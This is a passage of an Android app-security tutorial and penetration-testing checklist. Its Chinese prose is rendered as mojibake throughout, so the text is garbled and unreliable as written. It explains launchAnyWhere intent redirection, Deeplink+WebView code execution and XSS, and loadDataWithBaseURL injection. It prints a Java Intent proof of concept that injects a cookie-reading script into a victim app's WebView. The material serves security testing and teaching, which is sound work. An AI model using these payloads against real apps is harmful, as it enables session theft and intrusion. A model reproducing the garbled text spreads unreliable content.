<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ç»„ä»¶æ˜¾å¼è®¾ç½®android:exported=<span class="string">&quot;false&quot;</span></span><br><span class="line">ç»„ä»¶æ²¡æœ‰intent-<span class="built_in">filter</span>, ä¸”æ²¡æœ‰æ˜¾å¼è®¾ç½®android:exportedçš„å±æ€§å€¼ï¼Œé»˜è®¤ä¸ºéå¯¼å‡ºçš„;</span><br><span class="line">ç»„ä»¶è™½ç„¶é…ç½®äº†intent-<span class="built_in">filter</span>,ï¼Œä½†æ˜¯æ˜¾å¼è®¾ç½®android:exported=<span class="string">&quot;false&quot;</span></span><br></pre></td></tr></table></figure>
<p>è€Œé€šè¿‡ä¸€äº›æ–¹æ³•å¯ä»¥è®¿é—®æœªå¯¼å‡ºçš„ç»„ä»¶ï¼Œè¿™ç§æ¼æ´æˆä¸ºlaunchAnyWhereæ¼æ´</p>
<p>Intentå¯ä»¥é€šè¿‡é‡å®šå‘çš„åŸç†ï¼Œé€šè¿‡æºå¸¦æ•°æ®ä¿¡æ¯ï¼Œè®¿é—®ä¸€ä¸ªå¯å¯¼å‡ºçš„ç»„ä»¶ï¼Œç„¶åå†è¿›è¡Œæ•°æ®ä¼ é€’å»è§¦å‘ä¸å¯å¯¼å‡ºçš„ç»„ä»¶ï¼Œæœ€åå®ç°è®¿é—®ç§æœ‰ç»„ä»¶çš„ç›®çš„ï¼Œå¼•èµ·<code>launchAnyWhere</code>æ¼æ´</p>
<p><strong>æ¼æ´å¤ç°</strong></p>
<p>é¦–å…ˆæ˜¯ä¸å¯å¯¼å‡ºç»„ä»¶PrivateActivity:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_DFCPGD63DGYF3HU.png" alt="image-20220730124850689"></p>
<p>ç„¶åå¯å¯¼å‡ºçš„ç»„ä»¶ï¼šWebView2Activity</p>
<p>ä»£ç å±‚çš„æ ¡éªŒä»£ç ï¼š</p>
<p>WebView2Activity</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_UTXVH9Q5AYRTWVH-17277663837329.png" alt="image-20220730125041041"></p>
<p>PrivateActivity</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_MMQXRU274JXCJRT-172776639201112.png" alt="image-20220730125108657"></p>
<p>æ”»å‡»ä»£ç ï¼š</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_W4Q2EBR4BJMXG2R-172776641592615.png" alt="image-20220730125254413"></p>
<p>å¯ä»¥çœ‹å‡ºæˆ‘ä»¬é€šè¿‡WebView+Intenté‡å®šå‘å°±å¯ä»¥è®¿é—®ç§æœ‰ç»„ä»¶ï¼Œä»è€Œå®ç°launchAnyWhereæ¼æ´</p>
<h4 id="Deeplink-WebViewæ¼æ´">Deeplink + WebViewæ¼æ´</h4>
<h5 id="ä»»æ„ä»£ç æ‰§è¡Œæ¼æ´"><strong>ä»»æ„ä»£ç æ‰§è¡Œæ¼æ´</strong></h5>
<p><strong>æ¼æ´åŸç†</strong></p>
<p>æ ·æœ¬ä»£ç å±‚é€šè¿‡åå°„è°ƒç”¨æŸä¸ªæ‰‹æœºä¸Šå·²ç»å®‰è£…çš„åº”ç”¨ï¼Œç„¶åè°ƒç”¨è¿™ä¸ªåº”ç”¨çš„æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ ç›¸åŒçš„åŒ…åï¼Œç„¶åå°†æ”»å‡»æ ·æœ¬å®‰è£…åˆ°æ‰‹æœºä¸Šå»ï¼Œä½¿å¾—åº”ç”¨è§¦å‘ä»»æ„ä»£ç æ‰§è¡Œæ¼æ´</p>
<p>æ ·æœ¬ä»£ç </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_ZTVPKHEC4XQMYCD.png" alt="image-20220730125800892"></p>
<p>è°ƒç”¨com.insecureshopapp.Maininterfaceä¸‹çš„getinstanceæ–¹æ³•</p>
<p>æ„é€ æ”»å‡»æ ·æœ¬</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_J9EY8R3E44SH4U5.png" alt="image-20220730125820419"></p>
<p>æ³¨æ„è¿™é‡Œæˆ‘ä»¬è¦ä¿è¯æ„é€ çš„æ”»å‡»åº”ç”¨çš„åŒ…åå’Œä»£ç ä¸­æ ¡éªŒçš„ä¸€è‡´æ‰èƒ½è§¦å‘ï¼Œç„¶åæˆ‘ä»¬å¯åŠ¨ï¼Œå¯ä»¥å‘ç°æˆåŠŸçš„è§¦å‘äº†</p>
<h5 id="xssæ³¨å…¥æ¼æ´"><strong>xssæ³¨å…¥æ¼æ´</strong></h5>
<p><strong>æ¼æ´åŸç†</strong></p>
<p>ç»“åˆDeeplink+WebViewå¯¼è‡´çš„ä¸€ä¸ªæ¼æ´é—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ å«æ·±åº¦è°ƒç”¨é“¾çš„jsï¼Œç„¶åé€šè¿‡åŠ è½½å»å®ç°xssæ³¨å…¥</p>
<p><strong>æ¼æ´å¤ç°</strong></p>
<p>é¦–å…ˆæˆ‘ä»¬æŸ¥çœ‹æ ·æœ¬çš„DeepLinks</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_NAWTWSGDKWK8C82.png" alt="image-20220730130234190"></p>
<p>ç„¶åæˆ‘ä»¬å¯ä»¥å‘ç°æ ·æœ¬çš„ä»£ç ï¼š</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_8KJCX2AWWZRCTQQ.png" alt="image-20220730130256549"></p>
<p>æˆ‘ä»¬æ„é€ æ”»å‡»è„šæœ¬ï¼š</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_QA4SKBFC23HK4T8.png" alt="image-20220730130336427"></p>
<p>ç„¶åæˆ‘ä»¬é€šè¿‡å»è®¿é—®è¯¥html:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_7XWKDCAB62358C7.png" alt="image-20220730130416578"></p>
<p>æ¥ç€æˆ‘ä»¬ä½¿ç”¨ç›®æ ‡æ ·æœ¬æ‰“å¼€ï¼š</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_WZVGRQ9J7AZPFDA.png" alt="image-20220730130442740"></p>
<p>å³å¯ä»¥æˆåŠŸçš„è¿›è¡ŒXSSæ³¨å…¥</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_ARQAAUCNDV3N5BR.png" alt="image-20220730130506890"></p>
<h5 id="DeepLinksåœ¨WebViewä¸Šçš„ç»„åˆæ¼æ´">DeepLinksåœ¨WebViewä¸Šçš„ç»„åˆæ¼æ´</h5>
<p>æˆ‘ä»¬å‰é¢åˆ†æäº†å¾ˆå¤šDeepLinksåœ¨WebViewä¸Šçš„æ¼æ´ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥å°†è¿™äº›æ¼æ´ç»„åˆä½¿ç”¨ï¼Œæˆ‘åœ¨æµ‹è¯•ä¸€æ¬¾é“¶è¡Œçš„æ ·æœ¬ä¸­å‘ç°ç»„åˆæ¼æ´ï¼š</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_V55CMQ4ACJKK8WX.png" alt="image-20220730130714437"></p>
<p>å‚è€ƒæ–‡ç« ï¼š<a target="_blank" rel="noopener" href="http://blog.nsfocus.net/app-vulnerability-exploitation-combination-boxing/">APPæ¼æ´åˆ©ç”¨ç»„åˆæ‹³â€”â€”åº”ç”¨å…‹éš†æ¡ˆä¾‹åˆ†æ</a></p>
<h5 id="loadDataWithBaseURLæ¼æ´">loadDataWithBaseURLæ¼æ´</h5>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/81Lq-JwASnkSS2wg62HSvA?">Androidä¸­çš„ç‰¹æ®Šæ”»å‡»é¢ï¼ˆäºŒï¼‰â€”â€”å±é™©çš„deeplink</a></p>
<p>å½“<code>loadDataWithBaseURL</code>çš„åŸŸåå’Œå†…å®¹åŒæ—¶å¯æ§æ—¶ï¼Œå¯ä»¥æ„é€ ä»»æ„åŸŸä¸‹çš„XSS</p>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">void</span> loadDataWithBaseURL</span><br><span class="line">(<span class="built_in">String</span> baseUrl,</span><br><span class="line"><span class="built_in">String</span> <span class="built_in">data</span>,</span><br><span class="line"><span class="built_in">String</span> mimeType,</span><br><span class="line"><span class="built_in">String</span> encoding,</span><br><span class="line"><span class="built_in">String</span> historyUrl)</span><br></pre></td></tr></table></figure>
<p>é™¤äº†æ˜æ˜¾çš„æƒ…å†µå¤–ï¼Œæ”»å‡»è€…æ§åˆ¶è°ƒç”¨ä¸­çš„<code>baseUri</code>å’Œå‚æ•°<code>data</code></p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">webView.loadDataWithBaseURL<span class="punctuation">(</span><span class="string">&quot;https://google.com/&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="string">&quot;&lt;script&gt;document.write(document.domain)&lt;/script&gt;&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="literal">null</span><span class="punctuation">,</span> <span class="literal">null</span><span class="punctuation">,</span> <span class="literal">null</span><span class="punctuation">)</span><span class="punctuation">;</span></span><br></pre></td></tr></table></figure>
<p><strong>æ¼æ´åŸç†</strong></p>
<p>deeplinkåŠ è½½ä»»æ„fragmentï¼Œè½¬åŒ–ä¸ºWebView loadDataWithBaseURLæ¼æ´</p>
<p><strong>æ¼æ´å¤ç°</strong></p>
<p>å®ç°æ­¥éª¤ï¼š</p>
<figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>)victim-app://c/contact/<span class="number">2</span>?fragmen_class=<span class="variable">&lt;fragment&gt;</span>å¯å¯åŠ¨ä»»æ„<span class="keyword">fragment</span>ï¼Œå¹¶å¯ é€šè¿‡Intent Extraä¼ å‚</span><br><span class="line">(<span class="number">2</span>)å¯»æ‰¾åˆ°â¼€ä¸ªå¸¦WebViewçš„Fragmentï¼šGoogleMapWebViewFragment</span><br><span class="line">(<span class="number">3</span>)å¯æ±¡æŸ“<span class="built_in">load</span>DataWithBaseURLçš„å‰ä¸¤ä¸ªå‚æ•°ï¼Œæ„é€ victim.comåŸŸä¸‹çš„XSS</span><br><span class="line">webview.<span class="built_in">load</span>DataWithBaseURL(<span class="string">&quot;victim.com&quot;</span>,<span class="string">&quot;google-map.html&quot;</span>,    <span class="string">&quot;text/html&quot;</span>,    ...);</span><br></pre></td></tr></table></figure>
<p>æ”»å‡»ä»£ç </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(Intent.ACTION_VIEW);</span><br><span class="line">payload.setData(Uri.parse(<span class="string">&quot;victim-app://c/contact/2?fragmen_class=com.victim.app.GoogleWebViewMapFragment&quot;</span>));</span><br><span class="line"><span class="type">Bundle</span> <span class="variable">extra</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Bundle</span>();</span><br><span class="line">extra.putString(<span class="string">&quot;map_url&quot;</span>, <span class="string">&quot;\&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&lt;script&gt;&quot;</span>);</span><br><span class="line">extra.putString(<span class="string">&quot;map_file_name&quot;</span>, <span class="string">&quot;google_map.html&quot;</span>);</span><br><span class="line">extra.putString(<span class="string">&quot;map_domain&quot;</span>, <span class="string">&quot;https://www.victim-app.com&quot;</span>);</span><br><span class="line">payload.putExtra(<span class="string">&quot;bundle&quot;</span>, extra);</span><br><span class="line">startActivity(payload);</span><br></pre></td></tr></table></figure>
<h1>å®‰å…¨åˆ†æå·¥å…·å®‰å…¨</h1>
<h2 id="drozer">drozer</h2>
<p>å‚è€ƒbç«™æ•™ç¨‹</p>
<h2 id="MobSF">MobSF</h2>
<p>dockerå®‰è£…æŠ¥é”™ï¼Œå‚è€ƒhttps://kresna.dev/solving-podman-error-short-name-did-not-resolve-to-an-alias-and-no-unqualified-search-registries/</p>
<p>githubä¸­ä¸‹è½½é¡¹ç›®ï¼Œç„¶ååœ¨ç›¸åº”æ–‡ä»¶å¤¹ä¸‹æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./setup.<span class="keyword">sh</span></span><br><span class="line">./<span class="keyword">run</span>.<span class="keyword">sh</span></span><br><span class="line">ç„¶åæµè§ˆå™¨ä¸­ http:<span class="comment">//localhost:8000</span></span><br></pre></td></tr></table></figure>
<h1>APPæ¸—é€æµ‹è¯•è¦ç‚¹</h1>
<p>æµ‹è¯•ç‚¹å¦‚ä¸‹å›¾<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/image-20241005195332293.png" alt="image-20241005195332293"></p>
<h2 id="å®¢æˆ·ç«¯ç¨‹åºå®‰å…¨">å®¢æˆ·ç«¯ç¨‹åºå®‰å…¨</h2>
<h3 id="å®‰è£…åŒ…ç­¾å">å®‰è£…åŒ…ç­¾å</h3>
<p>å¦‚ä¸‹å‘½ä»¤æ£€æŸ¥apkç­¾å</p>
<p><strong>jarsigner.exe -verify APK æ–‡ä»¶è·¯å¾„ -verbose -certs</strong>     å¦‚æœCN=t001såˆ™å®‰å…¨</p>
<p>åªæœ‰åœ¨ä½¿ç”¨ç›´æ¥å®¢æˆ·çš„è¯ä¹¦ç­¾åæ—¶ï¼Œæ‰è®¤ä¸ºå®‰å…¨ã€‚Debug è¯ä¹¦ã€ç¬¬ä¸‰æ–¹ï¼ˆå¦‚</p>
<p>å¼€å‘æ–¹ï¼‰è¯ä¹¦ç­‰ç­‰å‡è®¤ä¸ºé£é™©ã€‚</p>
<p><strong>å®‰å…¨å»ºè®®</strong></p>
<p>å°†å®‰è£…åŒ…è¿›è¡Œç­¾åå¹¶æ£€æµ‹å®‰è£…åŒ…ç­¾åçš„å¼‚å¸¸</p>
<h3 id="åç¼–è¯‘ä¿æŠ¤">åç¼–è¯‘ä¿æŠ¤</h3>
<p>â€‹        æµ‹è¯•å®¢æˆ·ç«¯å®‰è£…ç¨‹åºï¼Œåˆ¤æ–­æ˜¯å¦èƒ½åç¼–è¯‘ä¸ºæºä»£ç ï¼Œjava ä»£ç å’Œ so æ–‡ä»¶æ˜¯å¦å­˜åœ¨ä»£ç æ··æ·†ç­‰ä¿æŠ¤æªæ–½ã€‚æœªä½œä¿æŠ¤çš„ java ä»£ç ï¼Œå¯ä»¥è½»æ˜“åˆ†æå…¶è¿è¡Œé€»è¾‘ï¼Œå¹¶é’ˆå¯¹ä»£ç ä¸­çš„ç¼ºé™·å¯¹å®¢æˆ·ç«¯æˆ–æœåŠ¡å™¨ç«¯è¿›è¡Œæ”»å‡»ã€‚æˆåŠŸçš„åç¼–è¯‘å°†ä½¿å¾—æ”»å‡»è€…èƒ½å¤Ÿå®Œæ•´åœ°åˆ†æ APP çš„è¿è¡Œé€»è¾‘ï¼Œå°¤å…¶æ˜¯ç›¸å…³ä¸šåŠ¡æ¥å£åè®®ã€å’Œé€šä¿¡åŠ å¯†çš„å®ç°</p>
<p>å¦‚æœapkæœ‰èŠ±æŒ‡ä»¤ï¼Œapktoolä¼šå‡ºç°è§£åŒ…å¤±è´¥</p>
<h3 id="åº”ç”¨å®Œæ•´æ€§æ ¡éªŒ">åº”ç”¨å®Œæ•´æ€§æ ¡éªŒ</h3>
<p>â€‹        æµ‹è¯•å®¢æˆ·ç«¯ç¨‹åºæ˜¯å¦å¯¹è‡ªèº«å®Œæ•´æ€§è¿›è¡Œæ ¡éªŒã€‚æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡åç¼–è¯‘çš„æ–¹æ³•åœ¨å®¢æˆ·ç«¯ç¨‹åºä¸­æ¤å…¥è‡ªå·±çš„æœ¨é©¬ï¼Œå®¢æˆ·ç«¯ç¨‹åºå¦‚æœæ²¡æœ‰è‡ªæ ¡éªŒæœºåˆ¶çš„è¯ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šé€šè¿‡ç¯¡æ”¹å®¢æˆ·ç«¯ç¨‹åºçªƒå–æ‰‹æœºç”¨æˆ·çš„éšç§ä¿¡æ¯ã€‚</p>
<p><strong>å¦‚æœæ²¡æœ‰è¿›è¡Œæ ¡éªŒ</strong></p>
<p>å¯¹äºä¿®æ”¹åçš„apkè¿›è¡Œé‡æ–°æ‰“åŒ…ç­¾åå®‰è£…ï¼Œä»ç„¶ä¼šæ­£å¸¸è¿è¡Œï¼ˆéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœä¹‹å‰å®‰è£…çš„ APK å’Œä¿®æ”¹åçš„ APK ç­¾åä¸åŒï¼Œå°±ä¸èƒ½ç›´æ¥è¦†ç›–å®‰è£…ï¼Œä¸€èˆ¬æ¥è¯´ï¼Œå…ˆå¸è½½ä¹‹å‰å®‰è£…çš„ APP å³å¯ï¼‰ã€æ³¨ï¼šAPK å¿…é¡»è¿›è¡Œç­¾ååï¼Œæ–¹å¯å®‰è£…å’Œè¿è¡Œã€‚å¦‚æœå¼€å¯äº†â€œå…è®¸æœªçŸ¥æ¥æºçš„åº”ç”¨â€ï¼Œé‚£ä¹ˆ Debug è¯ä¹¦ã€è‡ªç­¾åè¯ä¹¦ã€è¿‡æœŸè¯ä¹¦çš„ç­¾åéƒ½æ˜¯å¯ä»¥çš„ï¼Œä½†æ˜¯ä¸å¯ä»¥ä¸ç­¾åã€‚ã€‘</p>
<p><strong>å¦‚æœæœ‰è¿›è¡Œæ ¡éªŒ</strong></p>
<p>å®‰è£…çš„apkä¼šæ— æ³•æ­£å¸¸è¿è¡Œ</p>
<p><strong>å¨èƒç­‰çº§</strong></p>
<p>â€‹        è‹¥åº”ç”¨å®Œæ•´æ€§æ ¡éªŒä¸ä½¿ç”¨ MANIFEST.MF ä¸­çš„æ•°æ®ï¼Œä¸”æ ¸å¿ƒä»£ç é€šè¿‡ JNI æŠ€æœ¯å†™å…¥.soåº“ï¼ŒåŒæ—¶äºæœåŠ¡ç«¯è¿›è¡Œç›¸å…³æ ¡éªŒï¼Œæ­¤æ—¶æ— é£é™©ã€‚</p>
<p>â€‹       è‹¥åº”ç”¨å®Œæ•´æ€§äºæœ¬åœ°è¿›è¡ŒéªŒè¯è€Œä¸å­˜åœ¨å…¶ä»–é—®é¢˜æˆ–ä½¿ç”¨ MANIFEST.MF ä¸­çš„æ•°æ®ä½œä¸ºéªŒè¯å‡­è¯ï¼ˆæœ‰æ–°æ–‡ä»¶æ—¶æç¤ºåº”ç”¨å®Œæ•´æ€§éªŒè¯å¤±è´¥ï¼‰ï¼Œæ­¤æ—¶ä½é£é™©ï¼›</p>
<p>â€‹       è‹¥åœ¨æœ¬åœ°è¿›è¡ŒéªŒè¯çš„åŸºç¡€ä¸Šåªé€šè¿‡ MANIFEST.MF å¯¹å®¢æˆ·ç«¯åŸæœ‰æ–‡ä»¶è¿›è¡Œæ ¡éªŒè€Œå¿½ç•¥æ–°å¢æ–‡ä»¶çš„æ£€éªŒï¼Œæ­¤æ—¶ä¸­é£é™©ï¼›</p>
<p>â€‹       è‹¥æœªè¿›è¡Œåº”ç”¨å®Œæ•´æ€§æ ¡éªŒæ­¤æ—¶é«˜é£é™©</p>
<h3 id="ç»„ä»¶å®‰å…¨">ç»„ä»¶å®‰å…¨</h3>
<p>æŸ¥çœ‹æ˜¯å¦æ˜¯å¯å¯¼å‡ºçš„</p>
<h2 id="æ•æ„Ÿä¿¡æ¯å®‰å…¨">æ•æ„Ÿä¿¡æ¯å®‰å…¨</h2>
<h3 id="æ•°æ®æ–‡ä»¶">æ•°æ®æ–‡ä»¶</h3>
<p>æ£€æµ‹å®¢æˆ·ç«¯æ˜¯å¦ä¿å­˜æ˜æ–‡æ•æ„Ÿä¿¡æ¯ï¼Œèƒ½å¦é˜²æ­¢ç”¨æˆ·æ•æ„Ÿä¿¡æ¯çš„éæˆæƒè®¿é—®ã€‚</p>
<p>æ–‡ä»¶æ•æ„Ÿä¿¡æ¯æ³„éœ²ä»¥æ˜æ–‡å­˜å‚¨â€œè®°ä½å¯†ç â€å±…å¤šã€‚ä¸€èˆ¬æ¥è¯´ï¼Œå…ˆå°†å®‰å“è®¾å¤‡ä¸­çš„æ–‡ä»¶å¤åˆ¶åˆ°æœ‰é¼ æ ‡çš„ä¸»æœºä¸Šï¼Œæ–¹ä¾¿æŸ¥çœ‹ã€‚</p>
<p><strong>æµ‹è¯•æ­¥éª¤</strong></p>
<p>é¦–å…ˆæŸ¥çœ‹ç›¸å…³æ–‡ä»¶çš„æƒé™é…ç½®ã€‚</p>
<p>æ­£å¸¸çš„æ–‡ä»¶æƒé™æœ€åä¸‰ä½åº”ä¸ºç©ºï¼ˆç±»ä¼¼â€œrw-rw----â€ï¼‰ï¼Œå³é™¤åº”ç”¨è‡ªå·±ä»¥å¤–ä»»ä½•äººæ— æ³•è¯»å†™ï¼›ç›®å½•åˆ™å…è®¸å¤šä¸€ä¸ªæ‰§è¡Œä½ï¼ˆç±»ä¼¼â€œrwxrwxâ€”xâ€ï¼‰ã€‚</p>
<p>å½“å®¢æˆ·ç«¯ä½¿ç”¨ MODE_WORLD_READABLE æˆ– MODE_WORLD_WRITEABLE æ¨¡å¼åˆ›å»ºæ–‡ä»¶æ—¶ï¼Œshared_prefs ç›®å½•ä¸‹æ–‡ä»¶çš„æƒé™ä¹Ÿä¼šå¤šå‡ºä¸€äº›ï¼Œè¿™ä¸ä¸€å®šæ˜¯å®‰å…¨é—®é¢˜</p>
<p>æƒé™æ£€æµ‹å®Œæ•´åï¼Œå†æ£€æŸ¥å®¢æˆ·ç«¯ç¨‹åºå­˜å‚¨åœ¨æ‰‹æœºä¸­çš„ SharedPreferences é…ç½®æ–‡ä»¶ï¼Œé€šå¸¸æ˜¯å¯¹æœ¬ç›®å½•ä¸‹çš„æ–‡ä»¶å†…å®¹ï¼ˆä¸€èˆ¬æ˜¯ xmlï¼‰è¿›è¡Œæ£€æŸ¥ï¼Œçœ‹æ˜¯å¦åŒ…å«æ•æ„Ÿä¿¡æ¯ã€‚</p>
<p>æœ€ååœ¨æ£€æµ‹ SQLite æ•°æ®åº“æ–‡ä»¶ï¼Œåœ¨ç§æœ‰ç›®å½•åŠå…¶å­ç›®å½•ä¸‹æŸ¥æ‰¾ä»¥.db ç»“å°¾çš„æ•°æ®åº“æ–‡ä»¶ã€‚å¯¹äºä½¿ç”¨äº† webView ç¼“å­˜çš„åº”ç”¨ï¼Œä¼šåœ¨ databases å­ç›®å½•ä¸­ä¿å­˜ webview.db å’ŒwebviewCache.dbï¼Œå¦‚å›¾æ‰€ç¤ºã€‚å…¶ä¸­æœ‰å¯èƒ½ä¼šè®°å½• cookies å’Œæäº¤è¡¨å•ç­‰ä¿¡æ¯ã€‚</p>
<p>è¿˜æœ‰äº›æ—¶å€™ï¼Œå®¢æˆ·ç«¯ç¨‹åº apk åŒ…ä¸­ä¹Ÿæ˜¯æ˜¯ä¿å­˜æœ‰æ•æ„Ÿä¿¡æ¯çš„ï¼Œæ¯”å¦‚æ£€æŸ¥ apk åŒ…ä¸­å„ç±»æ–‡ä»¶æ˜¯å¦åŒ…å«ç¡¬ç¼–ç çš„çš„æ•æ„Ÿä¿¡æ¯ç­‰ã€‚</p>
<h3 id="Logcatæ—¥å¿—">Logcatæ—¥å¿—</h3>
<p>æœ¬é¡¹ä¸»è¦æ˜¯æ£€æŸ¥å®¢æˆ·ç«¯ç¨‹åºå­˜å‚¨åœ¨æ‰‹æœºä¸­çš„æ—¥å¿—æ˜¯å¦å«æœ‰æ•æ„Ÿä¿¡æ¯ã€‚</p>
<p><strong>logcat -d</strong>    <strong>//ä¸€æ¬¡æ€§è¾“å‡ºæ—¥å¿—ç¼“å­˜ï¼Œä¸ä¼šé˜»å¡</strong></p>
<p><strong>å®‰å…¨å»ºè®®</strong></p>
<p>æ•°æ®ä¼ è¾“åº”åšåˆ°åŠ å¯†å¤„ç†ï¼Œæ•æ„Ÿä¿¡æ¯ä¸è¦è¾“å‡ºåœ¨ logcat æ—¥å¿—ä¸­</p>
<h2 id="å¯†ç å®‰å…¨"><strong>å¯†ç å®‰å…¨</strong></h2>
<h3 id="é”®ç›˜åŠ«æŒ">é”®ç›˜åŠ«æŒ</h3>
<p>æµ‹è¯•å®¢æˆ·ç«¯ç¨‹åºåœ¨å¯†ç ç­‰è¾“å…¥æ¡†æ˜¯å¦ä½¿ç”¨è‡ªå®šä¹‰è½¯é”®ç›˜ã€‚å®‰å“åº”ç”¨ä¸­çš„è¾“å…¥æ¡†é»˜è®¤ä½¿ç”¨ç³»ç»Ÿè½¯é”®ç›˜ï¼Œæ‰‹æœºå®‰è£…æœ¨é©¬åï¼Œæœ¨é©¬å¯ä»¥é€šè¿‡æ›¿æ¢ç³»ç»Ÿè½¯é”®ç›˜ï¼Œè®°å½•æ‰‹æœºé”®ç›˜è¾“è¿‡çš„å¯†ç </p>
<h3 id="éšæœºå¸ƒå±€è½¯é”®ç›˜">éšæœºå¸ƒå±€è½¯é”®ç›˜</h3>
<p>æµ‹è¯•å®¢æˆ·ç«¯å®ç°çš„è½¯é”®ç›˜ï¼Œæ˜¯å¦æ»¡è¶³é”®ä½éšæœºå¸ƒæ”¾è¦æ±‚ã€‚</p>
<h3 id="å±å¹•å½•åƒ">å±å¹•å½•åƒ</h3>
